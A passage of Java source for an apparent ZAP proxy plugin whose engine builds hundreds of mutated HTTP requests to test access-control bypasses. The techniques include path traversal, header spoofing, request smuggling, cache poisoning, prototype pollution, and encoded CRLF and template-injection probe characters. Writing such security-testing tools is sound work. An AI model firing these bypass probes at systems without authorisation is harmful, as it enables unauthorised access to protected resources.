package org.zaproxy.zap.extension.hacktor;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.LinkedHashMap;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.Map;
import java.util.Set;
import java.util.function.BiConsumer;
import java.util.function.Supplier;
import java.util.regex.Pattern;

import org.parosproxy.paros.network.HttpMessage;
import org.parosproxy.paros.network.HttpRequestHeader;
import org.apache.commons.httpclient.URI;
import org.zaproxy.zap.extension.hacktor.technique.TechniqueBuilder;
import org.zaproxy.zap.network.HttpRequestConfig;

/**
 * Core bypass engine. Generates 400+ mutated HTTP requests from a base message,
 * preserving all original headers and body. Each mutation targets a specific
 * access-control bypass technique.
 */
public class HacktorEngine {

    public interface ProgressListener {
        void onProgress(int current, int total, String label);
        void onComplete(List<Result> results);
    }

    /** Injection position for a custom header's value relative to any existing value. */
    public enum HeaderMode {
        SET,
        APPEND,
        PREPEND
    }

    /** Mode for modifying the request body. */
    public enum BodyMode {
        REPLACE,
        APPEND,
        PREPEND,
        INSERT
    }

    /** A user-configured header rule: a name, an optional find-string to locate inside the
     *  base request's current value of that header (each fuzz word replaces it), and whether
     *  the result replaces (SET), is appended to (APPEND), or is inserted before (PREPEND)
     *  any existing value. A blank find-string falls back to FUZZ tokens. */
    public static final class CustomHeader {
        private String name;
        private List<String> values = new ArrayList<>();
        private HeaderMode mode = HeaderMode.SET;
        private String find = "";

        public CustomHeader() {}

        public CustomHeader(String name, List<String> values, HeaderMode mode) {
            this.name = name;
            this.values = new ArrayList<>(values);
            this.mode = mode;
        }

        public String getName() { return name; }
        public void setName(String name) { this.name = name; }

        public List<String> getValues() { return values; }
        public void setValues(List<String> values) { this.values = new ArrayList<>(values); }

        public HeaderMode getMode() { return mode; }
        public void setMode(HeaderMode mode) { this.mode = mode; }

        public String getFind() { return find; }
        public void setFind(String find) { this.find = find == null ? "" : find; }

        public String valuesCsv() { return String.join(", ", values); }
    }

    /** A user-configured request body payload rule: how to modify the body and what fragments to inject. */
    public static final class BodyPayload {
        private String mode = BodyMode.REPLACE.name();
        private List<String> fragments = new ArrayList<>();

        public String getMode() { return mode; }
        public void setMode(String mode) { this.mode = mode; }

        public List<String> getFragments() { return fragments; }
        public void setFragments(List<String> fragments) { this.fragments = new ArrayList<>(fragments); }

        public String fragmentsCsv() { return String.join(", ", fragments); }
    }

    /** Custom headers injected into every request, when configured. */
    private final List<CustomHeader> customHeaders = new ArrayList<>();

    /** Fixed headers injected into every probe request (and the baseline), when configured. */
    private final List<CustomHeader> fixedHeaders = new ArrayList<>();

    /** Request body payload rules: how (REPLACE/APPEND/PREPEND/INSERT) and what fragments to inject. */
    private final List<BodyPayload> bodyPayloads = new ArrayList<>();

    /** When true, every probe is sent over the raw socket in {@link RawHttpSender}. */
    private boolean forceRawWire = false;
    /** Per-probe socket timeout in seconds; <= 0 means fall back to ZAP defaults. */
    private int soTimeoutSecs = -1;

    /** Replaces the whole custom-header rule set injected by {@link #runOne}. */
    public void setCustomHeaders(List<CustomHeader> headers) {
        customHeaders.clear();
        if (headers != null) {
            for (CustomHeader h : headers) {
                if (h != null && h.getName() != null && !h.getName().trim().isEmpty()) {
                    customHeaders.add(h);
                }
            }
        }
    }

    /** Clears all custom headers so nothing extra is injected. */
    public void clearCustomHeaders() {
        customHeaders.clear();
    }

    public List<CustomHeader> getCustomHeaders() { return customHeaders; }

    /** Sets a single SET-mode header and drops any other rules (mirrors old API). */
    public void setCustomHeader(String name, String value) {
        customHeaders.clear();
        if (name != null && !name.trim().isEmpty()) {
            List<String> vals = new ArrayList<>();
            vals.add(value);
            customHeaders.add(new CustomHeader(name.trim(), vals, HeaderMode.SET));
        }
    }

    /** Replaces the whole fixed-header set injected into every probe by {@link #runOne}. */
    public void setFixedHeaders(List<CustomHeader> headers) {
        fixedHeaders.clear();
        if (headers != null) {
            for (CustomHeader h : headers) {
                if (h != null && h.getName() != null && !h.getName().trim().isEmpty()) {
                    fixedHeaders.add(h);
                }
            }
        }
    }

    /** Clears all fixed headers so nothing extra is injected. */
    public void clearFixedHeaders() {
        fixedHeaders.clear();
    }

    public List<CustomHeader> getFixedHeaders() { return fixedHeaders; }

    /** Replaces the whole body-payload rule set applied by {@link #runOne}. */
    public void setBodyPayloads(List<BodyPayload> payloads) {
        bodyPayloads.clear();
        if (payloads != null) {
            for (BodyPayload p : payloads) {
                if (p != null && !p.getFragments().isEmpty()) {
                    bodyPayloads.add(p);
                }
            }
        }
    }

    /** Clears all body payload rules so the body is left untouched. */
    public void clearBodyPayloads() {
        bodyPayloads.clear();
    }

    public List<BodyPayload> getBodyPayloads() { return bodyPayloads; }

    /** Forces the next {@link #runOne} calls to send via {@link RawHttpSender}. */
    public void setForceRawWire(boolean forceRawWire) { this.forceRawWire = forceRawWire; }
    public boolean isForceRawWire() { return forceRawWire; }

    /** Per-probe socket timeout in seconds (<= 0 disables and uses ZAP defaults). */
    public void setSoTimeoutSeconds(int soTimeoutSecs) { this.soTimeoutSecs = soTimeoutSecs; }
    public int getSoTimeoutSeconds() { return soTimeoutSecs; }

    private static final Pattern ERROR_MARKERS = Pattern.compile(
        "access.denied|forbidden|unauthorized|not.authorized|not.permitted|" +
        "access.forbidden|error|exception|invalid.(token|session|credentials|permission)|" +
        "you.do.not.have.permission|permission.denied|authentication.failed|" +
        "login.required|no.permission|insufficient.(privilege|permission|rights)|" +
        "denied|blocked|csrf|malformed|bad.request|invalid.request|" +
        "404|not.found|no.route|not.rout|oops|something.went.wrong|an.unexpected",
        Pattern.CASE_INSENSITIVE
    );

    private static final Set<String> FAMILIES = new LinkedHashSet<>();
    private static final Map<String, Integer> FAMILY_ORDER = new LinkedHashMap<>();

    static {
        String[] order = {
            "Methods", "Case", "SegmentCase", "SegmentLetter", "SegmentMix",
            "SegmentDot", "Suffix", "Traversal", "Encoding", "Semicolon",
            "Headers", "Duplicate Headers", "IP Notation", "Cookies",
            "Query Params", "Content-Type", "Leading Slash", "Encoding Chain",
            "Fragment", "Homoglyph", "Padding", "Malformed Verbs",
            "Method Override", "Header Case", "Header Confusion",
            "API Headers", "Query Values", "Prototype Pollution",
            "JSON Body", "Absolute URI", "Null Byte", "Path Append",
            "Format Suffix", "Segment Dup", "Wildcard", "Auth Forwarding",
            "Authorization", "Host Header", "X-Original URL",
            "Unicode Zero-Width", "Matrix Params", "IP Combo",
            "Backslash Path", "X-Forwarded Prefix", "Mid-Path Dot",
            "Version Path", "TE/CL Framing", "Lowercase Method",
            "Referer Trust", "Hop-by-Hop", "Path Norm", "WAF Encoding",
            "Body Params", "Inference", "Scheme Tampering", "Raw Aberrations"
        };
        for (int i = 0; i < order.length; i++) {
            FAMILIES.add(order[i]);
            FAMILY_ORDER.put(order[i], i);
        }
    }

    /** Path decomposition context for a given base request. */
    private static final class PathContext {
        final String origPath;
        final String basePath;
        final String origQuery;
        final String baseClean;
        final String[] rawSegments;
        final String lastSeg;
        final String parent;

        PathContext(HttpMessage msg) {
            this.origPath = currentPath(msg);
            int qIdx = origPath.indexOf('?');
            this.basePath = (qIdx >= 0) ? origPath.substring(0, qIdx) : origPath;
            this.origQuery = (qIdx >= 0) ? origPath.substring(qIdx) : "";
            String bc = this.basePath;
            if (!bc.startsWith("/")) bc = "/" + bc;
            this.baseClean = bc.replaceAll("/+$", "");
            List<String> segs = new ArrayList<>();
            for (String s : this.baseClean.split("/")) {
                if (!s.isEmpty()) segs.add(s);
            }
            this.rawSegments = segs.toArray(new String[0]);
            this.lastSeg = this.rawSegments.length > 0
                ? this.rawSegments[this.rawSegments.length - 1] : "";
            int lastSlash = this.baseClean.lastIndexOf('/');
            this.parent = (lastSlash >= 0) ? this.baseClean.substring(0, lastSlash + 1) : "/";
        }
    }

    // ─── Message helpers ────────────────────────────────────────────────

    static String joinPath(String[] segments) {
        return "/" + String.join("/", segments);
    }

    static String joinPath(List<String> segments) {
        return "/" + String.join("/", segments);
    }

    static void replacePath(HttpMessage msg, String newPathWithQuery) {
        replacePath(msg, newPathWithQuery, false);
    }

    static void replacePath(HttpMessage msg, String newPathWithQuery, boolean keepFragment) {
        URI uri = msg.getRequestHeader().getURI();
        if (uri == null) return;
        String pathQuery = newPathWithQuery;

        // Strip fragment first (unless caller asked to keep it).
        if (!keepFragment) {
            int hashIdx = pathQuery.indexOf('#');
            if (hashIdx >= 0) pathQuery = pathQuery.substring(0, hashIdx);
        }

        int qi = pathQuery.indexOf('?');
        String pathPart = qi >= 0 ? pathQuery.substring(0, qi) : pathQuery;
        String queryPart = qi >= 0 ? pathQuery.substring(qi + 1) : null;

        // Absolute-form input (e.g. "http://[::1]/admin/panel"): detect before any
        // normalisation and store the literal string as the URI's path.
        if (pathPart.indexOf("://") > 0) {
            try {
                uri.setPath(pathPart);
                if (queryPart != null) uri.setQuery(queryPart);
                msg.getRequestHeader().setURI(uri);
            } catch (Exception ignore) {}
            return;
        }

        // Ensure the path starts with '/' (HTTP origin-form). baseClean may be empty
        // (e.g. for "/"), causing suffixes like "." to become "." instead of "./".
        if (!pathPart.startsWith("/")) pathPart = "/" + pathPart;

        try {
            uri.setPath(pathPart);
            if (queryPart != null && !queryPart.isEmpty()) uri.setQuery(queryPart);
            msg.getRequestHeader().setURI(uri);
        } catch (Exception ignore) {}
    }

    /**
     * Sets the request-target to an exact literal string on the wire, bypassing URI
     * re-encoding. For paths containing raw %XX (Padding), backslashes (Backslash/UNC),
     * or other characters that URI.setPath would double-encode.
     */
    static void setLiteralPath(HttpMessage msg, String literalPath) {
        try {
            String wirePath = literalPath;
            if (!wirePath.startsWith("/") && !wirePath.startsWith("*")
                && !wirePath.startsWith("\\") && !wirePath.startsWith("//?/")) {
                wirePath = "/" + wirePath;
            }
            msg.getRequestHeader().setHeader("X-Hacktor-WirePath", wirePath);
        } catch (Exception ignored) {}
    }

    private static void setPathWithFragment(HttpMessage msg, String pathWithFragment) {
        int hashIdx = pathWithFragment.indexOf('#');
        if (hashIdx < 0) {
            replacePath(msg, pathWithFragment, false);
            return;
        }
        String path = pathWithFragment.substring(0, hashIdx);
        String fragment = pathWithFragment.substring(hashIdx + 1);
        replacePath(msg, path, false);
        try {
            URI uri = msg.getRequestHeader().getURI();
            if (uri != null) uri.setFragment(fragment);
            msg.getRequestHeader().setURI(uri);
        } catch (Exception ignored) {}
    }

    private static void setMethod(HttpMessage msg, String method) {
        try { msg.getRequestHeader().setMethod(method); } catch (Exception ignored) {}
    }

    /**
     * Sets a custom HTTP version string on the request header. This modifies
     * the version at the end of the request line (e.g., "HTTP/1.1" → "HTTP/0.9").
     */
    private static void setHTTPVersion(HttpMessage msg, String version) {
        try {
            msg.getRequestHeader().setVersion(version);
        } catch (Exception ignored) {}
    }

    static void addHeader(HttpMessage msg, String name, String value) {
        try { msg.getRequestHeader().setHeader(name, value); } catch (Exception ignored) {}
    }

    /** Applies a single custom header rule to a request according to its mode.
     *  SET replaces any existing value; APPEND joins new values after existing;
     *  PREPEND inserts new values before existing. Existing values are merged
     *  with the new ones using a comma + space separator. */
    static void applyCustomHeader(HttpMessage msg, CustomHeader ch) {
        if (ch == null || ch.getName() == null || ch.getName().trim().isEmpty()) return;
        String name = ch.getName().trim();
        String injected = ch.valuesCsv();
        if (injected.isEmpty()) return;
        try {
            String existing = msg.getRequestHeader().getHeader(name);
            if (existing == null || existing.isEmpty() || ch.getMode() == HeaderMode.SET) {
                msg.getRequestHeader().setHeader(name, injected);
            } else if (ch.getMode() == HeaderMode.APPEND) {
                msg.getRequestHeader().setHeader(name, existing + ", " + injected);
            } else if (ch.getMode() == HeaderMode.PREPEND) {
                msg.getRequestHeader().setHeader(name, injected + ", " + existing);
            }
        } catch (Exception ignored) {}
    }

    /** Appends a value to an existing header value (or sets it if absent). */
    private static void appendHeaderValue(HttpMessage msg, String name, String value) {
        try {
            String existing = msg.getRequestHeader().getHeader(name);
            if (existing == null || existing.isEmpty()) {
                msg.getRequestHeader().setHeader(name, value);
            } else {
                msg.getRequestHeader().setHeader(name, existing + value);
            }
        } catch (Exception ignored) {}
    }

    /** First key present in a query string (without the leading '?'), else the fallback. */
    static String firstQueryKey(String queryWithQ, String fallback) {
        String s = queryWithQ;
        if (s != null) {
            int q = s.indexOf('?');
            if (q >= 0) s = s.substring(q + 1);
            if (s != null && !s.isEmpty()) {
                for (String pair : s.split("&")) {
                    int eq = pair.indexOf('=');
                    if (eq > 0) {
                        String k = pair.substring(0, eq);
                        if (!k.isEmpty()) return k;
                    }
                }
            }
        }
        return fallback;
    }

    /**
     * Rewrites a query string, replacing (or appending to) the value of {@code key}
     * with {@code payload} while preserving all other parameters verbatim. If the key
     * is absent it is appended.
     */
    static String rebuildQueryWithValue(String queryWithQ, String key, String payload, boolean appendValue) {
        String s = queryWithQ;
        if (s == null) s = "";
        if (s.startsWith("?")) s = s.substring(1);
        if (key == null || key.isEmpty()) key = "q";
        if (s.isEmpty()) return key + "=" + payload;
        StringBuilder sb = new StringBuilder();
        boolean done = false;
        String[] pairs = s.split("&");
        for (int i = 0; i < pairs.length; i++) {
            String pair = pairs[i];
            int eq = pair.indexOf('=');
            String k = (eq >= 0) ? pair.substring(0, eq) : pair;
            if (k.equals(key) && !done) {
                String v = (eq >= 0) ? pair.substring(eq + 1) : "";
                if (i > 0) sb.append('&');
                sb.append(key).append('=').append(appendValue ? v + payload : payload);
                done = true;
            } else {
                if (i > 0) sb.append('&');
                sb.append(pair);
            }
        }
        if (!done) sb.append('&').append(key).append('=').append(payload);
        return sb.toString();
    }

    static String rebuildQueryWithPrepend(String queryWithQ, String key, String payload) {
        String s = queryWithQ;
        if (s == null) s = "";
        if (s.startsWith("?")) s = s.substring(1);
        if (key == null || key.isEmpty()) key = "q";
        if (s.isEmpty()) return key + "=" + payload;
        StringBuilder sb = new StringBuilder();
        boolean done = false;
        String[] pairs = s.split("&");
        for (int i = 0; i < pairs.length; i++) {
            String pair = pairs[i];
            int eq = pair.indexOf('=');
            String k = (eq >= 0) ? pair.substring(0, eq) : pair;
            if (k.equals(key) && !done) {
                String v = (eq >= 0) ? pair.substring(eq + 1) : "";
                if (i > 0) sb.append('&');
                sb.append(key).append('=').append(payload).append(v);
                done = true;
            } else {
                if (i > 0) sb.append('&');
                sb.append(pair);
            }
        }
        if (!done) sb.append('&').append(key).append('=').append(payload);
        return sb.toString();
    }

    /**
     * Core placement engine: drops {@code payload} at the requested placement site of a
     * mutated request, so every vulnerability type gets its payload at an effective
     * injection point. Supported kinds — HDR (header append), SEG+ / SEG- (payload
     * appended/prepended at a path-segment boundary), ROOT-P ({@code /<payload>} with the
     * original path removed), ROOT-Q ({@code /?<payload>}), QREP / QAPP (payload replaces
     * or appends to a query parameter value).
     *
     * @param position segment index for SEG+ / SEG-; negative targets the last segment
     * @param queryKey query key for QREP / QAPP; null/empty resolves to the first existing
     *                 key of the request (fallback "q")
     * @param headerName header for HDR; null falls back to "Referer"
     */
    private static void applyVulnPlacement(HttpMessage c, String payload, String placement,
            int position, String queryKey, String headerName) {
        if (c == null || payload == null || placement == null) return;
        PathContext pctx = new PathContext(c);
        try {
            switch (placement) {
                case "HDR": {
                    String h = (headerName == null || headerName.isEmpty()) ? "Referer" : headerName;
                    appendHeaderValue(c, h, payload);
                    break;
                }
                case "UA": {
                    appendHeaderValue(c, "User-Agent", payload);
                    break;
                }
                case "SEG+":
                case "SEG-": {
                    String[] segs = pctx.rawSegments;
                    if (segs.length == 0) break;
                    int idx = (position < 0) ? segs.length - 1 : Math.min(position, segs.length - 1);
                    StringBuilder sb = new StringBuilder("/");
                    for (int i = 0; i < segs.length; i++) {
                        if (i > 0) sb.append("/");
                        if (i == idx) {
                            if ("SEG-".equals(placement)) sb.append(payload).append(segs[i]);
                            else sb.append(segs[i]).append(payload);
                        } else {
                            sb.append(segs[i]);
                        }
                    }
                    replacePath(c, sb.toString() + pctx.origQuery);
                    break;
                }
                case "ROOT-P": {
                    replacePath(c, "/" + payload + pctx.origQuery);
                    break;
                }
                case "ROOT-Q": {
                    replacePath(c, "/?" + payload);
                    break;
                }
                case "QREP":
                case "QAPP": {
                    String key = (queryKey == null || queryKey.isEmpty())
                        ? firstQueryKey(pctx.origQuery, "q") : queryKey;
                    String newQ = rebuildQueryWithValue(pctx.origQuery, key, payload,
                        "QAPP".equals(placement));
                    replacePath(c, pctx.basePath + "?" + newQ);
                    break;
                }
                default:
                    break;
            }
        } catch (Exception ignored) {}
    }

    /** Applies a body payload rule to a cloned request.
     *  REPLACE overwrites the body; APPEND / PREPEND concatenates;
     *  INSERT prepends before the body (effectively same as PREPEND). */
    static void applyBodyPayload(HttpMessage msg, BodyPayload p) {
        if (p == null || p.getFragments().isEmpty()) return;
        String injected = p.fragmentsCsv();
        if (injected.isEmpty()) return;
        String mode = p.getMode();
        if (mode == null) mode = BodyMode.REPLACE.name();
        try {
            String existing = msg.getRequestBody() != null ? msg.getRequestBody().toString() : "";
            String next;
            switch (mode) {
                case "APPEND":
                    next = existing + injected;
                    break;
                case "PREPEND":
                case "INSERT":
                    next = injected + existing;
                    break;
                case "REPLACE":
                default:
                    next = injected;
                    break;
            }
            msg.setRequestBody(next);
            msg.getRequestHeader().setContentLength(next.length());
        } catch (Exception ignored) {}
    }

    /** Append a cookie to the existing Cookie header (or set if none exists). */
    static void addCookie(HttpMessage msg, String cookieValue) {
        try {
            String existing = msg.getRequestHeader().getHeader("Cookie");
            if (existing != null && !existing.isEmpty()) {
                msg.getRequestHeader().setHeader("Cookie", existing + "; " + cookieValue);
            } else {
                msg.getRequestHeader().setHeader("Cookie", cookieValue);
            }
        } catch (Exception ignored) {}
    }

    private static HttpMessage cloneMsg(HttpMessage msg) { return msg.cloneAll(); }

    /** True if the request URI carries a literal '#' fragment that ZAP's HttpSender would strip. */
    private static boolean hasLiteralFragment(HttpMessage msg) {
        try {
            URI uri = msg.getRequestHeader().getURI();
            return uri != null && uri.hasFragment();
        } catch (Exception e) {
            return false;
        }
    }
    private static String currentPath(HttpMessage msg) {
        URI uri = msg.getRequestHeader().getURI();
        if (uri == null) return "";
        try {
            String pq = uri.getEscapedPathQuery();
            return (pq == null || pq.isEmpty()) ? "/" : pq;
        } catch (Exception e) {
            String s = uri.toString();
            return (s == null || s.isEmpty()) ? "/" : s;
        }
    }

    /** Strips a single leading '/' from the path, tolerating an empty path. */
    private static String stripLeadingSlash(String path) {
        if (path == null || path.length() <= 1) return "";
        return path.charAt(0) == '/' ? path.substring(1) : path;
    }

    private static String toFullwidth(String s) {
        StringBuilder sb = new StringBuilder(s.length());
        for (int i = 0; i < s.length(); i++) {
            int c = s.charAt(i);
            if (c == 45) sb.appendCodePoint(0xFF0D);
            else if (c >= 48 && c <= 57) sb.appendCodePoint(c - 48 + 0xFF10);
            else if (c >= 65 && c <= 90) sb.appendCodePoint(c - 65 + 0xFF21);
            else if (c >= 97 && c <= 122) sb.appendCodePoint(c - 97 + 0xFF41);
            else sb.append(s.charAt(i));
        }
        return sb.toString();
    }

    private static String[] mixedCase(String s) {
        List<String> out = new ArrayList<>(5);
        StringBuilder alt1 = new StringBuilder(s.length());
        StringBuilder alt2 = new StringBuilder(s.length());
        for (int i = 0; i < s.length(); i++) {
            char c = s.charAt(i);
            alt1.append(i % 2 == 0 ? Character.toUpperCase(c) : Character.toLowerCase(c));
            alt2.append(i % 2 == 0 ? Character.toLowerCase(c) : Character.toUpperCase(c));
        }
        out.add(alt1.toString());
        out.add(alt2.toString());
        if (s.length() > 1) {
            out.add(Character.toUpperCase(s.charAt(0)) + s.substring(1).toLowerCase());
            out.add(s.substring(0, s.length() - 1).toLowerCase() + Character.toUpperCase(s.charAt(s.length() - 1)));
        }
        if (s.length() > 2) {
            out.add(Character.toLowerCase(s.charAt(0)) + Character.toUpperCase(s.charAt(1)) + s.substring(2).toLowerCase());
        }
        return out.toArray(new String[0]);
    }

    private static String encodeURIComponent(String s) {
        StringBuilder sb = new StringBuilder(s.length());
        for (int i = 0; i < s.length(); i++) {
            char c = s.charAt(i);
            if ((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') || (c >= '0' && c <= '9')
                || c == '-' || c == '_' || c == '.' || c == '~') {
                sb.append(c);
            } else {
                sb.append('%');
                String hex = Integer.toHexString(c).toUpperCase();
                if (hex.length() < 2) sb.append('0');
                sb.append(hex);
            }
        }
        return sb.toString();
    }

    // ─── Technique builder registry ──────────────────────────────────────

    private static final TechniqueBuilder[] TECHNIQUE_BUILDERS = {
        new org.zaproxy.zap.extension.hacktor.technique.FragmentTechniqueBuilder(),
        new org.zaproxy.zap.extension.hacktor.technique.HomoglyphTechniqueBuilder(),
        new org.zaproxy.zap.extension.hacktor.technique.PaddingTechniqueBuilder(),
        new org.zaproxy.zap.extension.hacktor.technique.VerbTechniqueBuilder(),
        new org.zaproxy.zap.extension.hacktor.technique.HTTPVersionTechniqueBuilder(),
        new org.zaproxy.zap.extension.hacktor.technique.RequestLineTechniqueBuilder(),
        new org.zaproxy.zap.extension.hacktor.technique.ProtocolDowngradeTechniqueBuilder(),
        new org.zaproxy.zap.extension.hacktor.technique.HTTP2PseudoHeaderTechniqueBuilder(),
        new org.zaproxy.zap.extension.hacktor.technique.SchemeTamperingTechniqueBuilder(),
        new org.zaproxy.zap.extension.hacktor.technique.RawRequestAberrationsTechniqueBuilder(),
        new org.zaproxy.zap.extension.hacktor.technique.ConnectionHeaderTechniqueBuilder(),
        new org.zaproxy.zap.extension.hacktor.technique.RequestSmugglingTechniqueBuilder(),
        new org.zaproxy.zap.extension.hacktor.technique.CachePoisoningTechniqueBuilder(),
        new org.zaproxy.zap.extension.hacktor.technique.HeaderNormalizationTechniqueBuilder(),
        new org.zaproxy.zap.extension.hacktor.technique.MethodOverrideTechniqueBuilder(),
        new org.zaproxy.zap.extension.hacktor.technique.HeaderCaseTechniqueBuilder(),
        new org.zaproxy.zap.extension.hacktor.technique.HeaderConfusionTechniqueBuilder(),
        new org.zaproxy.zap.extension.hacktor.technique.APIHeaderTechniqueBuilder(),
        new org.zaproxy.zap.extension.hacktor.technique.APIQueryParamTechniqueBuilder(),
        new org.zaproxy.zap.extension.hacktor.technique.QueryValueTechniqueBuilder(),
        new org.zaproxy.zap.extension.hacktor.technique.PrototypePollutionTechniqueBuilder(),
        new org.zaproxy.zap.extension.hacktor.technique.JSONBodyTechniqueBuilder(),
        new org.zaproxy.zap.extension.hacktor.technique.AbsoluteURITechniqueBuilder(),
        new org.zaproxy.zap.extension.hacktor.technique.NullByteTechniqueBuilder(),
        new org.zaproxy.zap.extension.hacktor.technique.PathAppendTechniqueBuilder(),
        new org.zaproxy.zap.extension.hacktor.technique.FormatSuffixTechniqueBuilder(),
        new org.zaproxy.zap.extension.hacktor.technique.SegmentDupTechniqueBuilder(),
        new org.zaproxy.zap.extension.hacktor.technique.WildcardTechniqueBuilder(),
        new org.zaproxy.zap.extension.hacktor.technique.AuthForwardingTechniqueBuilder(),
        new org.zaproxy.zap.extension.hacktor.technique.AuthorizationTechniqueBuilder(),
        new org.zaproxy.zap.extension.hacktor.technique.HostHeaderTechniqueBuilder(),
        new org.zaproxy.zap.extension.hacktor.technique.XOriginalURLTechniqueBuilder(),
        new org.zaproxy.zap.extension.hacktor.technique.UnicodeZeroWidthTechniqueBuilder(),
        new org.zaproxy.zap.extension.hacktor.technique.MatrixParamTechniqueBuilder(),
        new org.zaproxy.zap.extension.hacktor.technique.IPComboTechniqueBuilder(),
        new org.zaproxy.zap.extension.hacktor.technique.BackslashPathTechniqueBuilder(),
        new org.zaproxy.zap.extension.hacktor.technique.XForwardedPrefixTechniqueBuilder(),
        new org.zaproxy.zap.extension.hacktor.technique.MidPathDotTechniqueBuilder(),
        new org.zaproxy.zap.extension.hacktor.technique.VersionPathTechniqueBuilder(),
        new org.zaproxy.zap.extension.hacktor.technique.TECLFramingTechniqueBuilder(),
        new org.zaproxy.zap.extension.hacktor.technique.LowercaseMethodTechniqueBuilder(),
        new org.zaproxy.zap.extension.hacktor.technique.RefererTrustTechniqueBuilder(),
        new org.zaproxy.zap.extension.hacktor.technique.HopByHopTechniqueBuilder(),
        new org.zaproxy.zap.extension.hacktor.technique.PathNormalizationTechniqueBuilder(),
    };

    // ─── Technique builder ──────────────────────────────────────────────

    /** OOB callback URL in effect for this engine instance; overrides persisted
     *  config when set by the UI, and falls back to the config otherwise. */
    private String oobUrl;

    /** Sets the out-of-band callback URL used by {@link #buildTechniques}. Passing a
     *  blank or null value reverts to the URL persisted in ZAP's global config. */
    public void setOobUrl(String url) {
        this.oobUrl = (url == null) ? null : url.trim();
    }

    public List<Technique> buildTechniques(HttpMessage baseMsg) {
        PathContext ctx = new PathContext(baseMsg);
        BiConsumer<HttpMessage, String> setPath = (m, p) -> replacePath(m, p + ctx.origQuery);

        List<Technique> techs = new ArrayList<>();
        buildMethodTechniques(techs, baseMsg, setPath, ctx);
        buildCaseTechniques(techs, setPath, ctx);
        buildSegmentCaseTechniques(techs, setPath, ctx);
        buildSegmentDotTechniques(techs, setPath, ctx);
        buildSuffixTechniques(techs, setPath, ctx);
        buildTraversalTechniques(techs, setPath, ctx);
        buildEncodingTechniques(techs, setPath, ctx);
        buildSemicolonTechniques(techs, setPath, ctx);
        buildHeaderTechniques(techs, setPath, ctx);
        buildDuplicateHeaderTechniques(techs, ctx);
        buildIPNotationTechniques(techs, ctx);
        buildCookieTechniques(techs, ctx);
        buildQueryParamTechniques(techs, setPath, ctx);
        buildContentTypeTechniques(techs, ctx);
        buildLeadingSlashTechniques(techs, setPath, ctx);
        buildEncodingChainTechniques(techs, setPath, ctx);
        TechniqueBuilder.PathContext builderCtx =
            new TechniqueBuilder.PathContext(
                ctx.origPath, ctx.basePath, ctx.origQuery, ctx.baseClean,
                ctx.rawSegments, ctx.lastSeg, ctx.parent);
        for (TechniqueBuilder b : TECHNIQUE_BUILDERS) {
            b.build(techs, setPath, builderCtx);
        }

        buildVulnClassTechniques(techs, ctx);

        buildWafEncodeTechniques(techs, ctx);

        buildOobTechniques(techs, ctx);

        buildBodyParamTechniques(techs, baseMsg);

        buildInferenceTechniques(techs, baseMsg, ctx);

        return techs;
    }

    // ─── 0b1. Inference char probes (problematic-character mapping) ─────

    /**
     * Each entry is {display label, literal payload}. The payloads are dropped at URL
     * path, header and body-value surfaces to map how each parser/decoder layer (WAF,
     * proxy, router, application, backend) treats the character. Sent over the raw wire
     * so percent-sequences, reserved characters and whitespace reach the server
     * untranslated — the response code/length/timing differentials are the signal.
     */
    private static final String[][] INFERENCE_PROBES = {
        {"SQ'", "'"},             // single quote
        {"DQ\"", "\""},           // double quote
        {"BT`", "`"},             // backtick
        {"LT<", "<"},             // less-than
        {"GT>", ">"},             // greater-than
        {"OB[", "["},             // open bracket
        {"CB]", "]"},             // close bracket
        {"OC{", "{"},             // open brace
        {"CC}", "}"},             // close brace
        {"SC;", ";"},             // semicolon
        {"COL:", ":"},            // colon
        {"COM,", ","},            // comma
        {"AST*", "*"},            // asterisk
        {"QM?", "?"},             // question mark
        {"HASH#", "#"},           // hash
        {"AMP&", "&"},            // ampersand
        {"EQ=", "="},             // equals
        {"PCT%", "%"},            // percent
        {"PIPE|", "|"},           // pipe
        {"DOLLAR$", "$"},         // dollar (template/shell expansion)
        {"TMPL${", "${"},         // interpolation opener (SSTI)
        {"TPL{{", "{{"},          // mustache opener (SSTI)
        {"TAG<%", "<%"},          // template tag opener
        {"WIN\\", "\\"},          // backslash
        {"DBL//", "//"},          // double slash
        {"DOT..", ".."},          // dot-dot
        {"TRV../", "../"},        // dot-dot slash
        {"TAB\t", "\t"},          // horizontal tab
        {"NUL\\0", "\\0"},        // backslash-zero
        {"ENC-SQ%27", "%27"},
        {"ENC-DQ%22", "%22"},
        {"ENC-LT%3c", "%3c"},
        {"ENC-GT%3e", "%3e"},
        {"ENC-SP%20", "%20"},
        {"ENC-NUL%00", "%00"},
        {"ENC-CR%0d", "%0d"},
        {"ENC-LF%0a", "%0a"},
        {"ENC-CRLF%0d%0a", "%0d%0a"},
        {"ENC-DOT%2e", "%2e"},
        {"ENC-SL%2f", "%2f"},
        {"ENC-TRV%2e%2e%2f", "%2e%2e%2f"},
        {"ENC-SC%3b", "%3b"},
        {"ENC-Q%3f", "%3f"},
        {"ENC-H%23", "%23"},
        {"ENC-A%26", "%26"},
        {"ENC-E%3d", "%3d"},
        {"ENC-BS%5c", "%5c"},
        {"OVERLONG%c0%af", "%c0%af"},
        {"ZWNJ\u200c", "\u200c"},
        {"ZWSP\u200b", "\u200b"},
    };

    /** Expands the Inference family: each problematic character is dropped onto URL
     *  path, query-value and header surfaces, and into the value of every existing body
     *  parameter/ key. No new keys or body parameters are ever invented — a body probe
     *  only exists when the request that was captured for testing actually carries a
     *  body — so parse/encode differentials show up as status / length / timing deltas
     *  without changing the parameter structure. */
    private void buildInferenceTechniques(List<Technique> techs, HttpMessage baseMsg, PathContext ctx) {
        List<BodyParams.Param> bodyParams;
        try {
            bodyParams = BodyParams.extract(baseMsg);
        } catch (Exception e) {
            bodyParams = new ArrayList<>();
        }
        String bodyCt = BodyParams.contentType(baseMsg);
        for (String[] p : INFERENCE_PROBES) {
            String display = p[0];
            String payload = p[1];

            // URL path surfaces: APPEND / PREPEND / REPLACE on the last segment.
            for (String op : new String[]{"APPEND", "PREPEND", "REPLACE"}) {
                String lastSeg = (ctx.rawSegments.length > 0) ? ctx.rawSegments[ctx.rawSegments.length - 1] : "";
                String parent = (ctx.rawSegments.length > 1)
                    ? ctx.origPath.substring(0, ctx.origPath.length() - lastSeg.length()) : "/";
                String pathValue;
                String tag;
                String where;
                switch (op) {
                    case "PREPEND":
                        pathValue = ctx.parent + payload + ctx.lastSeg + ctx.origQuery;
                        tag = "InfPATH-";
                        where = "prepended to the last path segment";
                        break;
                    case "REPLACE":
